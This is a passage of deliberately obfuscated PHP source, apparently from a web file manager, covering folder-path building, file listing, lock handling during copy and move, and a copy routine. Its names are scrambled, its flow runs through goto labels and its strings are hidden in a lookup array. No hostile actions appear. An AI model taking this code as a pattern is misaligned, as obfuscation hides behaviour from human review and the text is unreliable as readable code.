($DÔ™¿åÎ°ß as &$f®””’†«ç) { goto DÉ’Ø°„Ä™; DÉ’Ø°„Ä™: $Aëà„í…‰¢ = $this->parentLevelArray($f®””’†«ç[$Bª„‘±Î[470]]); $BÜößòİÎÖ = $this->_listAppendPathRoot($f®””’†«ç, $Aëà„í…‰¢); foreach ($Aëà„í…‰¢ as $FòŠ¡ê†¯Ş => $BçÜ¥Ìµ„‘) { if ($FòŠ¡ê†¯Ş == 0 && $BÜößòİÎÖ && $f®””’†«ç[$Bª„‘±Î[380]] == self::TYPE_GROUP) { continue; } if (isset($Få±¯Î±¨¹[$BçÜ¥Ìµ„‘])) { $BÜößòİÎÖ .= $Få±¯Î±¨¹[$BçÜ¥Ìµ„‘] . $Bª„‘±Î[18]; } } goto cìÓÏ¥¡¶; cìÓÏ¥¡¶: if ($Aëà„í…‰¢) { $BÜößòİÎÖ .= $f®””’†«ç[$Bª„‘±Î[38]]; } if ($f®””’†«ç[$Bª„‘±Î[379]]) { $BÜößòİÎÖ .= $Bª„‘±Î[18]; } $f®””’†«ç[$Bª„‘±Î[477]] = str_replace($Bª„‘±Î[478], $Bª„‘±Î[18], $BÜößòİÎÖ); goto C…©Àíôøæ; C…©Àíôøæ: $A¸¢ÒË´Ÿ¢ = trim($f®””’†«ç[$Bª„‘±Î[477]], $Bª„‘±Î[18]); if ($f®””’†«ç[$Bª„‘±Î[472]] == $Bª„‘±Î[479] && $A¸¢ÒË´Ÿ¢) { $f®””’†«ç[$Bª„‘±Î[38]] = $A¸¢ÒË´Ÿ¢; } $this->_listAppendPathRecycle($f®””’†«ç, $Aëà„í…‰¢, $D‡¹Ç›í”î); goto fĞê×‡ºöğ; fĞê×‡ºöğ: } unset($f®””’†«ç); goto E‰ ÒˆÎ…í; E‰ ÒˆÎ…í: return $DÔ™¿åÎ°ß; goto D’˜°”µç³; cõä´òÙ…: $Bª„‘±Î =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $Få±¯Î±¨¹ = array(); $Dè‘æ† ô¸ = array(); goto EâíÑÕëè¿; D’˜°”µç³: } private function _listAppendPathRecycle(&$aœ²¹Öì¨¹, $e°‡Ü«, $Fåğ½«áçâ) { goto F›§Ò“Ğùƒ; bõ£è¶´‚Ñ: $aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[470]] = $a¡Ê™ÇñèÃ[481] . implode($a¡Ê™ÇñèÃ[57], array_slice($e°‡Ü«, 1)) . $a¡Ê™ÇñèÃ[57]; if ($aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[378]] == $Fåğ½«áçâ) { $aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[470]] = $a¡Ê™ÇñèÃ[481]; $aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[472]] = $a¡Ê™ÇñèÃ[479]; $aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[38]] = LNG($a¡Ê™ÇñèÃ[480]); } $aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[482]] = $a¡Ê™ÇñèÃ[483]; goto Aò«‚õéèã; F›§Ò“Ğùƒ: $a¡Ê™ÇñèÃ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (intval($aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[380]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($Fåğ½«áçâ, $e°‡Ü«) && $aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[378]] != $Fåğ½«áçâ) { return; } goto A‰·İŠÌ; A‰·İŠÌ: $BÅî‰ñ“—Ö = explode($a¡Ê™ÇñèÃ[18], trim($aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[477]], $a¡Ê™ÇñèÃ[18])); $D»ëˆ‘î‰ = implode($a¡Ê™ÇñèÃ[18], array_slice($BÅî‰ñ“—Ö, 2)); $aœ²¹Öì¨¹[$a¡Ê™ÇñèÃ[477]] = $a¡Ê™ÇñèÃ[18] . LNG($a¡Ê™ÇñèÃ[480]) . $a¡Ê™ÇñèÃ[18] . ltrim($D»ëˆ‘î‰, $a¡Ê™ÇñèÃ[18]); goto bõ£è¶´‚Ñ; Aò«‚õéèã: } protected function _listAppendPathRoot(&$a«ëµôíÇ, $C…áÍˆ”©µ) { $C„Œö‚‡ñò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C©ã¤Î¼‚È = $C„Œö‚‡ñò[43]; if ($a«ëµôíÇ[$C„Œö‚‡ñò[380]] == self::TYPE_USER) { if (defined($C„Œö‚‡ñò[436]) && $a«ëµôíÇ[$C„Œö‚‡ñò[467]] == USER_ID) { $C©ã¤Î¼‚È = LNG($C„Œö‚‡ñò[484]); if (!$C…áÍˆ”©µ) { $a«ëµôíÇ[$C„Œö‚‡ñò[38]] = $C©ã¤Î¼‚È; } } else { $bîß¡›ÈßÃ = Model($C„Œö‚‡ñò[485])->getInfoSimple($a«ëµôíÇ[$C„Œö‚‡ñò[467]]); $C©ã¤Î¼‚È = LNG($C„Œö‚‡ñò[486]) . $C„Œö‚‡ñò[167] . $bîß¡›ÈßÃ[$C„Œö‚‡ñò[38]] . $C„Œö‚‡ñò[487]; } } else { if ($a«ëµôíÇ[$C„Œö‚‡ñò[380]] == self::TYPE_GROUP) { $bîß¡›ÈßÃ = Model($C„Œö‚‡ñò[469])->getInfoSimple($a«ëµôíÇ[$C„Œö‚‡ñò[467]]); $C©ã¤Î¼‚È = $bîß¡›ÈßÃ[$C„Œö‚‡ñò[38]]; } else { if ($a«ëµôíÇ[$C„Œö‚‡ñò[380]] == self::TYPE_SYSTEM) { $bîß¡›ÈßÃ = $this->sourceInfo($C…áÍˆ”©µ[0], !0); $C©ã¤Î¼‚È = $bîß¡›ÈßÃ[$C„Œö‚‡ñò[38]]; } } } $C©ã¤Î¼‚È = $C©ã¤Î¼‚È ? $C„Œö‚‡ñò[18] . $C©ã¤Î¼‚È . $C„Œö‚‡ñò[18] : $C„Œö‚‡ñò[18]; return $C©ã¤Î¼‚È; } protected function _listAppendUser(&$F÷öâàµ‰Ş) { goto eêĞÕ‚˜Ïø; dŒÙ¡ÒŞŠ: unset($A„×ºƒ³®Â); goto eï¾Ÿ©Ñáˆ; bÇø¸öò»: $e±‘µ÷“İ½ = array_merge($D¥Åä‰ê©…, $A„äšÈôõÉ); $dšáé³–¾£ = Model($eéÅäª¬ù[488])->userListInfo($e±‘µ÷“İ½); foreach ($F÷öâàµ‰Ş as &$A„×ºƒ³®Â) { $eÎï·”å = $A„×ºƒ³®Â[$eéÅäª¬ù[387]]; $A„×ºƒ³®Â[$eéÅäª¬ù[387]] = $dšáé³–¾£[$eÎï·”å] ? $dšáé³–¾£[$eÎï·”å] : !1; $eÎï·”å = $A„×ºƒ³®Â[$eéÅäª¬ù[388]]; $A„×ºƒ³®Â[$eéÅäª¬ù[388]] = $dšáé³–¾£[$eÎï·”å] ? $dšáé³–¾£[$eÎï·”å] : !1; if (isset($A„×ºƒ³®Â[$eéÅäª¬ù[426]]) && $A„×ºƒ³®Â[$eéÅäª¬ù[426]][$eéÅäª¬ù[489]]) { $fºÚ‰²ƒí‹ = $GLOBALS[$eéÅäª¬ù[16]][$eéÅäª¬ù[94]][$eéÅäª¬ù[490]]; if ($A„×ºƒ³®Â[$eéÅäª¬ù[426]][$eéÅäª¬ù[491]] <= time() - $fºÚ‰²ƒí‹) { $this->metaSet($A„×ºƒ³®Â[$eéÅäª¬ù[378]], $eéÅäª¬ù[489], null); $this->metaSet($A„×ºƒ³®Â[$eéÅäª¬ù[378]], $eéÅäª¬ù[491], null); unset($A„×ºƒ³®Â[$eéÅäª¬ù[426]][$eéÅäª¬ù[489]]); continue; } $eÄÓ—ó¶ë· = $A„×ºƒ³®Â[$eéÅäª¬ù[426]][$eéÅäª¬ù[489]]; $A„×ºƒ³®Â[$eéÅäª¬ù[426]][$eéÅäª¬ù[492]] = Model($eéÅäª¬ù[488])->getInfoSimpleOuter($eÄÓ—ó¶ë·); } } goto dŒÙ¡ÒŞŠ; eêĞÕ‚˜Ïø: $eéÅäª¬ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¥Åä‰ê©… = array_to_keyvalue($F÷öâàµ‰Ş, $eéÅäª¬ù[43], $eéÅäª¬ù[387]); $A„äšÈôõÉ = array_to_keyvalue($F÷öâàµ‰Ş, $eéÅäª¬ù[43], $eéÅäª¬ù[388]); goto bÇø¸öò»; eï¾Ÿ©Ñáˆ: } public function parentLevelArray($BÄÆ¬ˆ®òğ) { $D¤á‚‰¿‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÄÆ¬ˆ®òğ = explode($D¤á‚‰¿‚[57], trim($BÄÆ¬ˆ®òğ, $D¤á‚‰¿‚[57])); return array_remove_value($BÄÆ¬ˆ®òğ, $D¤á‚‰¿‚[479]); } public function listAll($B´Şòêğ¨) { goto CØôŠÔõˆ¢; CáÇ‹„²–˜: $A»ÍĞíÊ¤Ç = array(); foreach ($eÈêÉìİìä as $BÆ‹„‡’… => $a»´ÁùòÜ…) { goto BœºÂ‰‡; BœºÂ‰‡: $D¨´Ö¿·¾ = $this->parentLevelArray($a»´ÁùòÜ…[$a­ÄåöäŠ‘[470]]); array_shift($D¨´Ö¿·¾); $eŞ¾»¹…Ñˆ = $c¦×ËÜÇ´; goto f‚É†™È™; eé—‰ğŒè•: $eŞ¾»¹…Ñˆ = str_replace($a­ÄåöäŠ‘[478], $a­ÄåöäŠ‘[18], $eŞ¾»¹…Ñˆ); $eŞ¾»¹…Ñˆ = str_replace($a­ÄåöäŠ‘[478], $a­ÄåöäŠ‘[18], $eŞ¾»¹…Ñˆ); $cÃÕ”ÄöŞè = array($a­ÄåöäŠ‘[396] => str_replace($a­ÄåöäŠ‘[478], $a­ÄåöäŠ‘[18], $eŞ¾»¹…Ñˆ), $a­ÄåöäŠ‘[499] => intval($a»´ÁùòÜ…[$a­ÄåöäŠ‘[379]]), $a­ÄåöäŠ‘[400] => $this->pathInfoFilter($a»´ÁùòÜ…, !0)); goto f•İ‹äâÖ¢; f•İ‹äâÖ¢: if (!$a»´ÁùòÜ…[$a­ÄåöäŠ‘[379]]) { $cÃÕ”ÄöŞè[$a­ÄåöäŠ‘[428]] = $a»´ÁùòÜ…[$a­ÄåöäŠ‘[428]]; $cÃÕ”ÄöŞè[$a­ÄåöäŠ‘[500]] = $a»´ÁùòÜ…[$a­ÄåöäŠ‘[85]]; } $A»ÍĞíÊ¤Ç[] = $cÃÕ”ÄöŞè; goto b¡ÑÚóå³Ó; f‚É†™È™: for ($Aİ“‘‹­…ƒ = 0; $Aİ“‘‹­…ƒ < count($D¨´Ö¿·¾); $Aİ“‘‹­…ƒ++) { $eŞ¾»¹…Ñˆ .= $eÈêÉìİìä[$D¨´Ö¿·¾[$Aİ“‘‹­…ƒ]][$a­ÄåöäŠ‘[38]] . $a­ÄåöäŠ‘[18]; } $eŞ¾»¹…Ñˆ .= $a»´ÁùòÜ…[$a­ÄåöäŠ‘[38]]; if ($a»´ÁùòÜ…[$a­ÄåöäŠ‘[379]]) { $eŞ¾»¹…Ñˆ .= $a­ÄåöäŠ‘[18]; } goto eé—‰ğŒè•; b¡ÑÚóå³Ó: } return $A»ÍĞíÊ¤Ç; goto A‡ÓìÉãËÉ; B†š“Ê£óˆ: $eÈêÉìİìä = array_to_keyvalue($eÈêÉìİìä, $a­ÄåöäŠ‘[378]); $c¦×ËÜÇ´ = "\x2f{$Få»§”ƒ„[$a­ÄåöäŠ‘[38]]}\57"; $c¦×ËÜÇ´ = $c¦×ËÜÇ´ == $a­ÄåöäŠ‘[478] ? $a­ÄåöäŠ‘[18] : $c¦×ËÜÇ´; goto CáÇ‹„²–˜; dÒ‡Šğ¿Ù„: $this->_listAppendAuth($eÈêÉìİìä); $this->_listAppendUser($eÈêÉìİìä); $this->_listAppendPath($eÈêÉìİìä); goto B†š“Ê£óˆ; cí¾„‹ù‚‰: $d®ç„¥çâ— = $a­ÄåöäŠ‘[497]; $a…‰÷ç½ = "\x4c\105\x46\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\x69\x6f\137\146\x69\154\x65\40\x66\x69\x6c\145\40\x6f\x6e\40\163\157\x75\x72\143\x65\56\146\151\154\145\111\104\x20\x3d\x20\146\151\x6c\x65\x2e\146\x69\x6c\x65\x49\104"; $eÈêÉìİìä = $this->alias($a­ÄåöäŠ‘[498])->field($d®ç„¥çâ—)->where($A „âäƒ”‰)->join($a…‰÷ç½)->select(); goto dÒ‡Šğ¿Ù„; CØôŠÔõˆ¢: $a­ÄåöäŠ‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Få»§”ƒ„ = $this->sourceInfo($B´Şòêğ¨); $A „âäƒ”‰ = array($a­ÄåöäŠ‘[493] => array($a­ÄåöäŠ‘[494], $Få»§”ƒ„[$a­ÄåöäŠ‘[470]] . $B´Şòêğ¨ . $a­ÄåöäŠ‘[495]), $a­ÄåöäŠ‘[496] => 0); goto cí¾„‹ù‚‰; A‡ÓìÉãËÉ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($CàçŠâ´¦‹) { goto FŞÛ£ª¯è¶; e‰Ğê„ö„: $this->_lockEvent($CàçŠâ´¦‹, array($e›ØÕôØò[504], $e›ØÕôØò[505]), $dÜ¿®¡Ø°‹); $this->_lockCheckEnd($e›ØÕôØò[501], $CàçŠâ´¦‹); goto d‹¡Ê¼È°‡; FŞÛ£ª¯è¶: $e›ØÕôØò =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($e›ØÕôØò[501], $CàçŠâ´¦‹); goto f£ã…•‡å„; f£ã…•‡å„: $dÜ¿®¡Ø°‹ = 1; $this->_lockEvent($CàçŠâ´¦‹, array($e›ØÕôØò[502], $e›ØÕôØò[503]), $dÜ¿®¡Ø°‹); $this->_lockParent($CàçŠâ´¦‹, array($e›ØÕôØò[503]), $dÜ¿®¡Ø°‹); goto e‰Ğê„ö„; d‹¡Ê¼È°‡: } public function lockCopyEnd($CÊí¸†šì·) { $BšİäõÄÜ¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->allowLock()) { return; } $dÛÉĞá‚ò = 0; $this->_lockEvent($CÊí¸†šì·, array($BšİäõÄÜ¼[502], $BšİäõÄÜ¼[503]), $dÛÉĞá‚ò); $this->_lockParent($CÊí¸†šì·, array($BšİäõÄÜ¼[503]), $dÛÉĞá‚ò); $this->_lockEvent($CÊí¸†šì·, array($BšİäõÄÜ¼[504], $BšİäõÄÜ¼[505]), $dÛÉĞá‚ò); } public function lockWriteStart($BÊìÅË…¡, $cñ£Ä›ø›’ = '') { goto ağ•ä³‡É; ağ•ä³‡É: $f‡ˆÅÓ“ò· =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($f‡ˆÅÓ“ò·[502], $BÊìÅË…¡); goto D¼Õóà°ª; a„Ä»‘Ê½: $this->_lockParent($BÊìÅË…¡, array($f‡ˆÅÓ“ò·[501], $f‡ˆÅÓ“ò·[503]), $e›¦Û‘Ğƒœ); $this->_lockCheckEnd($f‡ˆÅÓ“ò·[502], $BÊìÅË…¡); goto bç²ÍñšÎî; D¼Õóà°ª: $e›¦Û‘Ğƒœ = 1; $this->_lockKey($f‡ˆÅÓ“ò·[506] . $BÊìÅË…¡ . $f‡ˆÅÓ“ò·[101] . $cñ£Ä›ø›’, $e›¦Û‘Ğƒœ); $this->_lockEvent($BÊìÅË…¡, array($f‡ˆÅÓ“ò·[501], $f‡ˆÅÓ“ò·[503]), $e›¦Û‘Ğƒœ); goto a„Ä»‘Ê½; bç²ÍñšÎî: } public function lockWriteEnd($AŒ¢ É¹ƒ‘, $B—ÆÎÈ˜· = '') { $A’ÏÎÁÃš =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->allowLock()) { return; } $A£ì„§Ÿ¶İ = 0; $this->_lockKey($A’ÏÎÁÃš[506] . $AŒ¢ É¹ƒ‘ . $A’ÏÎÁÃš[101] . $B—ÆÎÈ˜·, $A£ì„§Ÿ¶İ); $this->_lockEvent($AŒ¢ É¹ƒ‘, array($A’ÏÎÁÃš[501], $A’ÏÎÁÃš[503]), $A£ì„§Ÿ¶İ); $this->_lockParent($AŒ¢ É¹ƒ‘, array($A’ÏÎÁÃš[501], $A’ÏÎÁÃš[503]), $A£ì„§Ÿ¶İ); } public function lockMoveStart($DÉÌ„çÇ«™) { goto A†’î£‡¤; AÌ©•ªÀŒØ: $this->_lockParent($DÉÌ„çÇ«™, array($eÎ´À£ÜÉª[501], $eÎ´À£ÜÉª[503]), $fÓÖ¬›‹±¹); $this->_lockEvent($DÉÌ„çÇ«™, array($eÎ´À£ÜÉª[508], $eÎ´À£ÜÉª[504], $eÎ´À£ÜÉª[505]), $fÓÖ¬›‹±¹); $this->_lockCheckEnd($eÎ´À£ÜÉª[503], $DÉÌ„çÇ«™); goto fí´’—ëË—; A†’î£‡¤: $eÎ´À£ÜÉª =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÎ´À£ÜÉª[503], $DÉÌ„çÇ«™); goto aĞ‚³ßÃ’ë; aĞ‚³ßÃ’ë: $fÓÖ¬›‹±¹ = 1; $this->_lockKey($eÎ´À£ÜÉª[507] . $DÉÌ„çÇ«™, $fÓÖ¬›‹±¹); $this->_lockEvent($DÉÌ„çÇ«™, array($eÎ´À£ÜÉª[501], $eÎ´À£ÜÉª[502]), $fÓÖ¬›‹±¹); goto AÌ©•ªÀŒØ; fí´’—ëË—: } public function lockMoveEnd($d¹æñù³éš) { goto Cğõ‚¦›ê; E‡”İÏÑ“È: $this->_lockEvent($d¹æñù³éš, array($bßïøî¹´[508], $bßïøî¹´[504], $bßïøî¹´[505]), $d˜°Ü´•§Ì); goto eìÍÇˆÑœ›; Dƒ’…Õë§…: $this->_lockKey($bßïøî¹´[507] . $d¹æñù³éš, $d˜°Ü´•§Ì); $this->_lockEvent($d¹æñù³éš, array($bßïøî¹´[501], $bßïøî¹´[502]), $d˜°Ü´•§Ì); $this->_lockParent($d¹æñù³éš, array($bßïøî¹´[501], $bßïøî¹´[503]), $d˜°Ü´•§Ì); goto E‡”İÏÑ“È; Cğõ‚¦›ê: $bßïøî¹´ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->allowLock()) { return; } $d˜°Ü´•§Ì = 0; goto Dƒ’…Õë§…; eìÍÇˆÑœ›: } private function _lockCheck($F“ôÛ‡Ñ¦Á, $d½ƒÆß¡ì‹) { goto dÃØ“ÖË˜; fìäò×¥°‚: $this->_lockTimeStart[$EñŠöĞŸ] = timeFloat(); if (!is_array($eŠ„¿†¶µ³)) { return; } $D×ŠØÅæİ = LNG($Aª©±í„Â¡[509]); goto aö§¿«§©Ã; dÃØ“ÖË˜: $Aª©±í„Â¡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eŠ„¿†¶µ³ = $this->sourceInfo($d½ƒÆß¡ì‹); $EñŠöĞŸ = $F“ôÛ‡Ñ¦Á . $Aª©±í„Â¡[101] . $d½ƒÆß¡ì‹; goto fìäò×¥°‚; FÀ™”ñ­‹: $F•ÂŒÄíç¿ = array_reverse($this->parentLevelArray($eŠ„¿†¶µ³[$Aª©±í„Â¡[470]])); foreach ($F•ÂŒÄíç¿ as $C±ğÄ“Ã²) { $EñŠöĞŸ = $F“ôÛ‡Ñ¦Á . $Aª©±í„Â¡[510] . $C±ğÄ“Ã²; if (CacheLock::lockGet($Aª©±í„Â¡[511] . $EñŠöĞŸ)) { $eŠ„¿†¶µ³ = $this->sourceInfo($C±ğÄ“Ã²); CacheLock::setErrorMsg($Aª©±í„Â¡[167] . htmlspecialchars($eŠ„¿†¶µ³[$Aª©±í„Â¡[38]]) . $Aª©±í„Â¡[487] . $D×ŠØÅæİ); $this->_lockKey($EñŠöĞŸ, 1); $this->_lockKey($EñŠöĞŸ, 0); } } goto c‡ğÇ‡¿à; aö§¿«§©Ã: CacheLock::setErrorMsg($Aª©±í„Â¡[167] . htmlspecialchars($eŠ„¿†¶µ³[$Aª©±í„Â¡[38]]) . $Aª©±í„Â¡[487] . $D×ŠØÅæİ); $this->_lockKey($EñŠöĞŸ, 1); $this->_lockKey($EñŠöĞŸ, 0); goto FÀ™”ñ­‹; c‡ğÇ‡¿à: } private function _lockCheckEnd($C¤Ò“Ã‰æ“, $E°œÃÀÅİ) { goto CƒŒø‰ïÀÒ; D¼²­µõâã: if ($F“—êÚ´ñ > 0.5) { unset(self::$cacheSourceInfo[$EĞˆŞåˆçË[419] . $E°œÃÀÅİ]); } $e×ÁİËæ¶± = $this->sourceInfo($E°œÃÀÅİ); if (!$e×ÁİËæ¶±) { show_json(LNG($EĞˆŞåˆçË[111]), !1); } goto dÉîœùğƒÉ; Bà¦¡Å™‘•: if (!isset($this->_lockTimeStart[$D¢ëàô¹¯š])) { return; } $F“—êÚ´ñ = timeFloat() - $this->_lockTimeStart[$D¢ëàô¹¯š]; unset($this->_lockTimeStart[$D¢ëàô¹¯š]); goto D¼²­µõâã; CƒŒø‰ïÀÒ: $EĞˆŞåˆçË =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¢ëàô¹¯š = $C¤Ò“Ã‰æ“ . $EĞˆŞåˆçË[101] . $E°œÃÀÅİ; CacheLock::setErrorMsg($EĞˆŞåˆçË[370]); goto Bà¦¡Å™‘•; dÉîœùğƒÉ: } private function _lockParent($d«ØùÕ…ƒ³, $CÖªçÃ¥¤, $c¢½ÓÍ¬˜Ç) { if (!$this->autoLockSet) { return; } $eÑ’ÛÔ¡½‡ = $this->sourceInfo($d«ØùÕ…ƒ³); if (!is_array($eÑ’ÛÔ¡½‡)) { return; } $dàç‚ƒ«á = array_reverse($this->parentLevelArray($eÑ’ÛÔ¡½‡[$_SERVER[çŞáÓæÚô‚Ô‡][470]])); foreach ($dàç‚ƒ«á as $Cõ­“˜ùî) { $this->_lockEvent($Cõ­“˜ùî, $CÖªçÃ¥¤, $c¢½ÓÍ¬˜Ç); } } private function _lockEvent($EÆö»…ÛÀ, $d£È¤İŸœê, $eö‹ÉÁ°İ‘) { $Bº„Å£²— =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->autoLockSet) { return; } foreach ($d£È¤İŸœê as $e©ã‹àôÑÉ) { $Cœ¤Úï İ‹ = $e©ã‹àôÑÉ . $Bº„Å£²—[101] . $EÆö»…ÛÀ; if ($eö‹ÉÁ°İ‘ && CacheLock::lockGet($Bº„Å£²—[511] . $Cœ¤Úï İ‹)) { continue; } $this->_lockKey($Cœ¤Úï İ‹, $eö‹ÉÁ°İ‘); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Cí¬¹¼ˆÈš, $EµÛ„Ê¿Ì = 1) { $BØ·éÚß–¦ = $_SERVER[çŞáÓæÚô‚Ô‡][511] . md5($Cí¬¹¼ˆÈš); if ($EµÛ„Ê¿Ì) { if (isset(self::$_lockItemArr[$BØ·éÚß–¦])) { return; } self::$_lockItemArr[$BØ·éÚß–¦] = 1; CacheLock::lock($BØ·éÚß–¦, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$BØ·éÚß–¦])) { return; } unset(self::$_lockItemArr[$BØ·éÚß–¦]); CacheLock::unlock($BØ·éÚß–¦); } } public function isParentOf($AÓºáÒö‰Ø, $c£¿¬†Î£–) { goto e¿à±½²Åµ; e¿à±½²Åµ: $AÒ Ô‡†±’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÓ×ßÎ­Êõ = $this->sourceInfo($AÓºáÒö‰Ø); $CÁß…ˆÁ®˜ = $this->sourceInfo($c£¿¬†Î£–); goto b´ï ÎÄ‚; F†²™ß‘Â¼: return $D„ëîÑ¡­; goto D÷»µ†çÔ; b´ï ÎÄ‚: $CŸãõÕé¦ª = $aÓ×ßÎ­Êõ[$AÒ Ô‡†±’[470]] . $aÓ×ßÎ­Êõ[$AÒ Ô‡†±’[378]] . $AÒ Ô‡†±’[57]; $fÌ‡‰ã±„ê = $CÁß…ˆÁ®˜[$AÒ Ô‡†±’[470]] . $CÁß…ˆÁ®˜[$AÒ Ô‡†±’[378]] . $AÒ Ô‡†±’[57]; $D„ëîÑ¡­ = strpos($fÌ‡‰ã±„ê, $CŸãõÕé¦ª) === 0; goto F†²™ß‘Â¼; D÷»µ†çÔ: } private $targetIsDelete = 0; public function copy($Eò©ÒÛÔ©„, $Dä˜…‘›ñÇ, $AŞ¡±ÃÔÓÔ = REPEAT_REPLACE, $Eé™™¤ªÄ = '') { goto cì†‹›Šâ; E¾Ö¨¼ãäœ: $this->updateModifyTime($Dä˜…‘›ñÇ); return $A©“Î‰õ­; goto DÆ¸ÉŠäšŞ; a¨¾ÈÓ©¶¥: $this->saveAll($FÆ‹‡ÀË¤á[$bÂ ƒ­º—÷[514]]); Model($bÂ ƒ­º—÷[177])->linkAdd($FÆ‹‡ÀË¤á[$bÂ ƒ­º—÷[512]]); $this->folderSizeReset($Dä˜…‘›ñÇ); goto E¾Ö¨¼ãäœ; C¦´ ÙÜˆŒ: if (!$FÖ¢ĞÓÜ’ß || !$FÓ‘âÆÚÄ× || $FÓ‘âÆÚÄ×[$bÂ ƒ­º—÷[379]] != $bÂ ƒ­º—÷[93]) { return !1; } if ($this->isParentOf($Eò©ÒÛÔ©„, $Dä˜…‘›ñÇ)) { return !1; } $C„Ó­ïç¨Ø = $Eé™™¤ªÄ ? $Eé™™¤ªÄ : $FÖ¢ĞÓÜ’ß[$bÂ ƒ­º—÷[38]]; goto e³‡•–ô¼—; E®ÒåÃ®Áœ: if ($FÖ¢ĞÓÜ’ß[$bÂ ƒ­º—÷[379]] == $bÂ ƒ­º—÷[93] && $eƒ·˜²—â == $A©“Î‰õ­) { $this->folderSizeResetChildren($eƒ·˜²—â); } Model($bÂ ƒ­º—÷[515])->addAll($FÆ‹‡ÀË¤á[$bÂ ƒ­º—÷[513]], array(), !0); if ($eƒ·˜²—â != $A©“Î‰õ­ || $FÖ¢ĞÓÜ’ß[$bÂ ƒ­º—÷[379]] == $bÂ ƒ­º—÷[93]) { Model($bÂ ƒ­º—÷[516])->eventCopy($A©“Î‰õ­); } goto a¨¾ÈÓ©¶¥; e³‡•–ô¼—: $this->lockCopyStart($Eò©ÒÛÔ©„); $this->lockWriteStart($Dä˜…‘›ñÇ, $C„Ó­ïç¨Ø); $FÆ‹‡ÀË¤á = array($bÂ ƒ­º—÷[512] => array(), $bÂ ƒ­º—÷[513] => array(), $bÂ ƒ­º—÷[514] => array()); goto DŸì¤ì½ÇĞ; DŸì¤ì½ÇĞ: $this->targetIsDelete = intval($FÖ¢ĞÓÜ’ß[$bÂ ƒ­º—÷[406]]); $eƒ·˜²—â = $this->fileNameExistCache($Dä˜…‘›ñÇ, $FÖ¢ĞÓÜ’ß[$bÂ ƒ­º—÷[38]]); $A©“Î‰õ­ = $this->_copy($Eò©ÒÛÔ©„, $Dä˜…‘›ñÇ, $AŞ¡±ÃÔÓÔ, $FÆ‹‡ÀË¤á, !0, $Eé™™¤ªÄ); goto Fè“ç¾¿ÙÓ; Fè“ç¾¿ÙÓ: $this->_childrenListClear(); $this->lockCopyEnd($Eò©ÒÛÔ©„); $this->lockWriteEnd($Dä˜…‘›ñÇ, $C„Ó­ïç¨Ø); goto E®ÒåÃ®Áœ; cì†‹›Šâ: $bÂ ƒ­º—÷ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FÖ¢ĞÓÜ’ß = $this->sourceInfo($Eò©ÒÛÔ©„); $FÓ‘âÆÚÄ× = $this->sourceInfo($Dä˜…‘›ñÇ); goto C¦´ ÙÜˆŒ; DÆ¸ÉŠäšŞ: } private function _copy($C¹¸‚ë¸»Î, $fÛêí¨ø‘Š, $fêÅÆ¾×², &$Dô§‚È††, $Eƒ”êß¢, $EÓô•Æé¸õ = '') { goto eÑÖ™Ó‰; d¹™ùö£„¶: return $dƒÊ³…¹®—; goto e›«ÇÍÈêã; f“´õ“Àõ‰: if (!$f‹ïš´îÎ…) { return $this->_copyCreate($C¹¸‚ë¸»Î, $fÛêí¨ø‘Š, $A§ôÃà®ß, $Dô§‚È††); } $dƒÊ³…¹®— = $f‹ïš´îÎ…; if ($bê•Ì¾ôçÜ) { if ($fêÅÆ¾×² == REPEAT_RENAME_FOLDER) { $A§ôÃà®ß = $this->fileNameAutoCache($fÛêí¨ø‘Š, $A§ôÃà®ß, $fêÅÆ¾×², $bê•Ì¾ôçÜ); $dƒÊ³…¹®— = $this->_copyCreate($C¹¸‚ë¸»Î, $fÛêí¨ø‘Š, $A§ôÃà®ß, $Dô§‚È††); } else { $aÕ’Ö›Ô  = $this->_childrenList($C¹¸‚ë¸»Î); foreach ($aÕ’Ö›Ô  as $cÒ¦‚Õ¹†) { $this->_copy($cÒ¦‚Õ¹†[$AˆÇÆ²“§¤[378]], $f‹ïš´îÎ…, $fêÅÆ¾×², $Dô§‚È††, !1); } } } else { if ($fêÅÆ¾×² == REPEAT_RENAME || $fêÅÆ¾×² == REPEAT_RENAME_FOLDER) { $A§ôÃà®ß = $this->fileNameAutoCache($fÛêí¨ø‘Š, $A§ôÃà®ß, $fêÅÆ¾×², $bê•Ì¾ôçÜ); $dƒÊ³…¹®— = $this->_copyCreate($C¹¸‚ë¸»Î, $fÛêí¨ø‘Š, $A§ôÃà®ß, $Dô§‚È††); } else { if ($fêÅÆ¾×² == REPEAT_REPLACE) { $CŸ…¸Ì£¨‹ = $this->sourceInfoCache($f‹ïš´îÎ…); $e·™åÅ¤ˆí = $this->fileHistory($CŸ…¸Ì£¨‹, 